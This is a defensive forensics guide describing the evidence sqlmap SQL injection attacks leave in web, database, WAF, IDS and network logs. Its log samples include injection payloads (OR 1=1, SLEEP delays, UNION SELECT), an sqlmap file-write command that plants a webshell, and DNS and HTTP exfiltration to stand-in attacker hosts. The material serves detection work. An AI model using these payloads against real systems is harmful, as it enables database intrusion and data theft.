# sqlmap — Target Evidence

---

## Overview

**Target evidence** = artifacts left on the **victim/target** (web server, database server, network layer). These are the primary hunting signals and are often the only evidence accessible to defenders.

---

## Web Server Access Logs (HTTP Layer)

### Location

- **Apache:** `/var/log/apache2/access.log`, `/var/log/apache2/other_vhosts_access.log`
- **Nginx:** `/var/log/nginx/access.log`
- **IIS:** `%SystemRoot%\System32\LogFiles\W3SVC1\`
- **Application-level (PHP/Python):** Depends on application logging

### Payload Signatures in Access Logs

sqlmap's default payloads contain highly distinctive SQL syntax patterns. Examples:

```
GET /vulnerable.php?id=1' HTTP/1.1 → 200 OK, 1234 bytes
GET /vulnerable.php?id=1' OR '1'='1' HTTP/1.1 → 200 OK, 2341 bytes (significantly larger)
GET /vulnerable.php?id=1' AND SLEEP(5) -- HTTP/1.1 → 200 OK, slow response
GET /vulnerable.php?id=1 UNION SELECT 1,2,3,4,5 -- HTTP/1.1 → 500 error or altered content
GET /vulnerable.php?id=1' extractvalue(1, concat(0x7e, version())) -- HTTP/1.1 → 500 error with SQL output
```

### Rapid-Fire Request Pattern

sqlmap typically sends 5–50 requests per parameter in seconds (boolean-based, time-based, union-based, error-based testing in rapid succession). A human attacker or legitimate user wouldn't generate this pattern.

**Log signature:**
```
[2026-08-12 14:30:05] GET /search.php?q=1 HTTP/1.1
[2026-08-12 14:30:05] GET /search.php?q=1' HTTP/1.1
[2026-08-12 14:30:06] GET /search.php?q=1 OR 1=1 HTTP/1.1
[2026-08-12 14:30:06] GET /search.php?q=1 AND SLEEP(5) HTTP/1.1
[2026-08-12 14:30:11] GET /search.php?q=1 UNION SELECT 1,2,3 HTTP/1.1
...
(50+ requests in <2 minutes, similar parameter, escalating payload complexity)
```

### User-Agent and HTTP Headers

**Default User-Agent:** `sqlmap/1.10.8.29 (http://sqlmap.org)` — immediately identifiable.

**Evasion variant** (using `--random-agent`): User-Agent changes per request, mimicking a browser.

**Unmodified example:**
```
GET /vulnerable.php?id=1 HTTP/1.1
User-Agent: sqlmap/1.10.8.29 (http://sqlmap.org)
Host: target.com
Connection: close
```

### Forensic Value

**High.** Web server logs are non-repudiable and operator-side payloads are visible in plaintext. However:
- **Evasion:** `--tamper` scripts can obfuscate payloads (e.g., space2comment turns `OR 1=1` into `OR/**/1=1`).
- **Proxy:** If routed through a proxy, the proxy's logs are more detailed than the web server's.
- **Log rotation/deletion:** Old logs may be purged; check retention policy.

---

## Database Query Logs

### MySQL (`general_query_log`)

**Location:** `/var/lib/mysql/hostname.log` or configured in `my.cnf` via `log=/path/to/log`

**Default:** DISABLED (significant performance impact; many operators keep it off).

**If enabled, shows:**
```
2026-08-12 14:30:05 100 Query    SELECT * FROM users WHERE id='1'
2026-08-12 14:30:05 100 Query    SELECT * FROM users WHERE id='1' OR '1'='1' -- '
2026-08-12 14:30:06 100 Query    SELECT * FROM users WHERE id='1' AND SLEEP(5)
2026-08-12 14:30:10 100 Query    SELECT version()
2026-08-12 14:30:11 100 Query    SELECT @@datadir
2026-08-12 14:30:11 100 Query    SHOW DATABASES
2026-08-12 14:30:12 100 Query    SELECT * FROM information_schema.tables
```

### PostgreSQL (`log_statement`)

**Location:** `/var/log/postgresql/postgresql.log` (Linux) or PG data directory

**If enabled (log_statement = 'all'), shows:**
```
2026-08-12 14:30:05 [100] LOG: statement: SELECT * FROM users WHERE id='1'
2026-08-12 14:30:05 [100] LOG: statement: SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3
2026-08-12 14:30:06 [100] LOG: statement: SELECT version()
2026-08-12 14:30:06 [100] LOG: statement: \d information_schema.tables
```

### MSSQL (`sys.dm_exec_query_text` and SQL Agent audit)

**Location:** Event Viewer → Application or SQL Agent log

**Manually enabled trace (Profiler), shows:**
```
SQL:Batch Completed
SELECT * FROM users WHERE id=1 OR 1=1 -- 
SELECT @@version
SELECT * FROM sys.databases
```

### Forensic Value

**Extreme.** Database query logs are the smoking gun — they show exact SQL payloads, data extracted, and timing. However, most production systems have query logging disabled due to performance and storage overhead. Check:

```bash
# MySQL
SHOW VARIABLES LIKE 'general_log%';

# PostgreSQL
SHOW log_statement;

# MSSQL
SELECT * FROM sys.configurations WHERE name LIKE '%auditing%';
```

---

## Database Error Logs

### MySQL (`error.log`)

**Location:** `/var/log/mysql/error.log` or data directory

**Shows:**
```
2026-08-12 14:30:05 0 [ERROR] [HY000]: Syntax error near 'OR 1=1' at line 1
2026-08-12 14:30:06 0 [ERROR] [HY000]: Subquery returns more than 1 row
```

### PostgreSQL (`postgresql.log`)

**Location:** `/var/log/postgresql/postgresql.log`

**Shows:**
```
2026-08-12 14:30:05 [100] ERROR: syntax error at or near "OR"
2026-08-12 14:30:06 [100] ERROR: UNION types character and integer cannot be matched
```

### MSSQL (Event Viewer → Application)

**Shows:**
```
Msg 102, Level 15, State 1, Server MSSQL-01, Line 1
Incorrect syntax near 'OR'.
```

### Forensic Value

**Very High.** Error logs directly show sqlmap's payload attempts and are less likely to be deleted (often separate from query logs). Rapid sequences of syntax errors followed by successful queries indicate SQLi testing followed by exploitation.

---

## Application-Level Logs (PHP, Python, Java)

### PHP Error Log

**Location:** `/var/log/php-errors.log` or `/var/log/apache2/error.log`

**Shows:**
```
[12-Aug-2026 14:30:05 UTC] PHP Notice: Undefined offset in database.php line 42
[12-Aug-2026 14:30:05 UTC] PHP Fatal error: SQL Syntax Error, caught exception
```

### Python WSGI Application Log

**Location:** `/var/log/app/app.log` or stdout redirected to a file

**Shows:**
```
2026-08-12 14:30:05 ERROR: sql.execute() — SQLError: syntax error
2026-08-12 14:30:05 WARNING: Unusual query pattern detected: SELECT 20+ times in 30 seconds
```

### Java Application Log

**Location:** `$CATALINA_HOME/logs/catalina.out`

**Shows:**
```
14:30:05.123 ERROR [main] SQLException: Syntax error in SQL statement "...OR 1=1..."
14:30:05.124 ERROR [main] Parameter 'id' triggered 50 exceptions in 60 seconds
```

### Forensic Value

**Medium-High.** Application-level logs vary in detail; some frameworks log raw SQL, others don't. Check application documentation.

---

## HTTP Response Time Analysis

### Time-Based Blind Detection Signature

sqlmap uses `SLEEP()` (MySQL) or `WAITFOR DELAY` (MSSQL) to detect time-based blind SQLi. A log-based hunter can infer this pattern:

**Legitimate user pattern:**
```
GET /search.php?q=test → 50ms response
GET /search.php?q=test2 → 55ms response
GET /search.php?q=test3 → 48ms response
```

**sqlmap time-based blind pattern:**
```
GET /search.php?q=1 → 50ms response (baseline)
GET /search.php?q=1 AND SLEEP(5) → 5000ms response (5-second delay)
GET /search.php?q=1 AND SLEEP(10) → 10000ms response (10-second delay)
GET /search.php?q=1' AND SLEEP(5) -- → 5000ms response
```

The repeated 5–10 second response times for otherwise identical requests are highly distinctive. Standard load-balancing or application metrics (NewRelic, DataDog) will show this pattern.

### Forensic Value

**High.** Response times are difficult to spoof and automatically tracked by most APM tools. A 5-second delay followed by a 10-second delay for sequential requests is a strong SQLi indicator.

---

## WAF/IDS/IPS Logs

### ModSecurity (mod_security on Apache)

**Location:** `/var/log/modsec_audit/` or `/var/log/apache2/modsec_audit.log`

**Shows:**
```
[12/Aug/2026 14:30:05] id: 942100 — SQL Injection Attack Detected
  Matched Data: "' OR '1'='1'" in ARGS:id
  Message: SQL Injection Attack
  [file "rules/sql-injections.conf"]
  
[12/Aug/2026 14:30:06] id: 942200 — SQL UNION-based Injection
  Matched Data: "UNION SELECT 1,2,3" in ARGS:id
```

### Web Application Firewall (AWS WAF, Cloudflare, etc.)

**Shows:**
```
2026-08-12 14:30:05 Action: BLOCK, Rule: SQLi-Detection
  Payload: id=1' OR '1'='1'
  
2026-08-12 14:30:06 Action: BLOCK, Rule: SQLi-UNION
  Payload: id=1 UNION SELECT database()
```

### IDS/IPS (Suricata, Snort)

**Location:** `/var/log/suricata/eve.json` or Snort alert log

**Shows:**
```json
{
  "timestamp": "2026-08-12T14:30:05.123Z",
  "alert": {
    "action": "alert",
    "gid": 1,
    "signature_id": 2019220,
    "signature": "ET SQL_Injection_Attempt",
    "category": "SQL Injection",
    "severity": 1,
    "source": "192.168.1.100",
    "dest": "10.10.1.50",
    "payload": "' OR '1'='1'"
  }
}
```

### Forensic Value

**Extreme.** WAF/IDS alerts are built specifically for SQLi detection. Modern rules (e.g., OWASP ModSecurity Core Rule Set) catch 80–95% of sqlmap's default payloads. **Absence of alerts doesn't mean no attack happened** — evasion via `--tamper` scripts bypasses many signatures.

---

## Database-Level Audit/Transaction Logs

### MySQL Binary Log (`binlog`)

**Location:** `/var/log/mysql/mysql-bin.*`

**Shows:**
```
# at 1234
#260812 14:30:05 server id 1  end_log_pos 2341 Query thread_id=100
use webapp;
SELECT * FROM users WHERE id='1' OR '1'='1';
```

### PostgreSQL Write-Ahead Log (WAL)

**Location:** `$PGDATA/pg_wal/`

**Forensic recovery:** Not human-readable; requires `pg_waldump` or point-in-time recovery to extract.

### MSSQL Transaction Log

**Location:** `.ldf` files in SQL Server data directory

**Forensic recovery:** Requires specialized tools (e.g., Apex SQL Log) to read transaction log records.

### Forensic Value

**Very High.** Binary logs capture all committed transactions, including data modifications. If the attacker executed UPDATE/DELETE/INSERT via stacked queries, the transaction log contains evidence. Requires post-compromise forensics or insider access.

---

## File System Artifacts

### Temporary Files (if file-write is exploited)

If sqlmap gains file-write capability (via `--file-write=shell.php --file-dest=/var/www/html/shell.php`):

**Created files:**
```
/var/www/html/shell.php        (webshell)
/tmp/sqlmap_xxxxxxxx.txt       (temp payload staging)
/var/lib/mysql/udf_plugin.so   (UDF binary, if MySQL UDF loading is exploited)
```

**Forensic evidence:**
```bash
# Find recently-created web-accessible files
find /var/www/html -type f -newer /var/log/apache2/access.log -ls

# Check file ownership (if root-owned, likely privilege-escalation attack)
ls -la /var/www/html/shell.php
# -rw-r--r-- 1 mysql mysql 2341 Aug 12 14:35 shell.php

# Check if file matches known webshell signatures
sha256sum /var/www/html/shell.php | grep -f webshell_hashes.txt
```

### Forensic Value

**Extreme.** Webshells are direct evidence of successful exploitation and give the attacker persistent access. Their presence is a critical finding.

---

## Database Content Anomalies

### Extracted/Modified Sensitive Tables

If the attacker dumped or modified data:

**Detection signs:**
- **Authentication bypass:** Admin user created with weak password.
  ```sql
  SELECT * FROM users WHERE username='backdoor' AND password='12345';
  ```
- **Privilege escalation:** User role changed to admin.
  ```sql
  SELECT * FROM users WHERE is_admin=1;  (count increased)
  ```
- **Data exfiltration:** Suddenly high table scan counts on sensitive tables.
  ```sql
  SELECT COUNT(*) FROM credit_cards;  (query executed 1000s of times)
  ```

### Forensic Value

**Medium.** Requires baseline knowledge of what the database *should* contain. A new user with a generic name (`admin2`, `backdoor`, `test123`) in the users table is suspicious, but distinguishing attacker-created accounts from legitimate new accounts requires context.

---

## Network-Level Evidence (Firewall, Zeek, NetFlow)

### Outbound DNS Queries (if DNS exfiltration via `--dns-domain`)

sqlmap sends encoded data via DNS queries. Example:

```
Query: sgRhdGE9dGVzdA==.attacker.com (base64-encoded "data=test")
Query: bW9yZWRhdGE=.attacker.com
Query: cGFzc3dvcmRzPWFiYw==.attacker.com
```

### Detection:

```bash
# Zeek DNS log
dns.log: Query: *.attacker.com (hundreds of subdomains, single domain)

# System resolver log
tcpdump -i any 'udp port 53 and dst attacker.com' | grep -o "attacker.com" | sort | uniq -c
# Shows rapid-fire DNS queries to a single attacker-controlled domain
```

### Forensic Value

**Extreme.** DNS exfiltration leaves a direct trail from target to attacker infrastructure. Base64-encoded DNS queries can be decoded to recover exfiltrated data. Modern DNS filtering (e.g., Cisco Umbrella, Cloudflare) may block these; absence of queries suggests either:
1. No exfiltration attempted.
2. Network doesn't allow outbound DNS to external domains.
3. Attacker used an internal DNS server.

### Outbound HTTP/HTTPS Callbacks (alternative OOB)

If using Burp Collaborator or similar:

```bash
HTTP POST /callback HTTP/1.1
Host: attacker.burp-collab.net
Content-Type: application/x-www-form-urlencoded

data=extracted_password&user=admin&timestamp=1691825405
```

### Forensic Value

**Extreme.** HTTP callbacks are even more direct than DNS. Full data (unencoded) is visible in proxy logs.

---

## Performance and Load Anomalies

### Database CPU/Memory Spike

sqlmap's enumeration and error-based injection generate hundreds of queries in seconds, causing:

- **CPU spike:** Database query processor overwhelmed.
- **Disk I/O spike:** Large table scans (UNION queries, information_schema scans).
- **Memory spike:** Result set buffering.

**Detection (via monitoring tools):**
```
14:30:00 — CPU 10%, Memory 30%
14:30:05 — CPU 95%, Memory 85% (sudden spike)
14:30:30 — CPU 15%, Memory 35% (returns to baseline)
```

The sudden 25-second CPU spike correlating with rapid database query log entries indicates an active SQLi attack.

### Forensic Value

**Medium.** Performance anomalies alone don't prove SQLi, but combined with error logs or WAF alerts, they strengthen the evidence chain.

---

## Timeline Building (Coordinated Evidence)

### Realistic Compromise Narrative

```
14:30:00 — Web Server Access Log
  GET /search.php?q=test HTTP/1.1 → 200 OK

14:30:05 — Web Server Access Log + Database Error Log + WAF Alert
  GET /search.php?q=1' OR '1'='1' HTTP/1.1 → 200 OK (but response size doubled)
  [ERROR] Syntax error near OR
  ModSecurity: Rule 942100 — SQL Injection Detected

14:30:06–14:30:30 — Database Query Log (if enabled)
  Query: SELECT * FROM users WHERE id='1' OR '1'='1'  ✓ Success
  Query: SELECT version()  ✓
  Query: SHOW DATABASES  ✓
  Query: SELECT * FROM information_schema.tables LIMIT 100  ✓
  (40+ queries in 24 seconds, clear reconnaissance phase)

14:30:35 — Database Modification (if detected via audit)
  INSERT INTO users (username, password) VALUES ('backdoor', 'MD5(weak)')

14:35:00 — File System + Web Access Log
  POST /upload.php (file-write payload) → shell.php created in web root
  GET /shell.php?cmd=id → 200 OK

14:40:00 — Network Log
  Outbound DNS: sghlbG8gd29ybGQqKg==.attacker.com  (base64 exfiltrated data)
```

**Evidence chain:**
1. Attack inception (malformed SQL in access log).
2. Technique testing (error log shows different injection methods).
3. Data reconnaissance (query log shows INFORMATION_SCHEMA queries).
4. Privilege escalation (new backdoor user created).
5. Persistence (webshell uploaded).
6. Exfiltration (DNS callback to attacker).

A forensic investigator can piece this together to build a complete attack timeline.

---

## Key Distinguishing Signals

| Signal | Strength | Evasion-Proof? |
|--------|----------|----------------|
| Rapid-fire HTTP requests to same parameter, escalating complexity | Very High | No (time-based signatures) |
| SQL error messages in response (syntax errors, injection strings) | Very High | No (if error-based technique used) |
| Database query log showing hundreds of info_schema queries | Extreme | Partially (query log can be disabled) |
| Time-based delay pattern (5s, 10s, 15s responses) | Very High | Difficult (inherent to technique) |
| WAF alerts for SQLi patterns | High | Yes (tamper scripts bypass) |
| DNS exfiltration to attacker domain | Extreme | No (DNS logs are infrastructure-level) |
| Webshell creation + OS command execution in logs | Extreme | No (filesystem artifacts persist) |

---

## Key Takeaway

**Target evidence is abundant and multi-layered.** A well-instrumented system (web logs, database logs, WAF, IDS, monitoring) captures SQLi attacks at every stage. The challenge is correlation: piecing together events from 5–10 different logs to build a coherent timeline. sqlmap's automated, rapid-fire nature makes it *easier* to detect than slow, manual SQLi testing, because the attack's speed leaves a distinctive footprint.

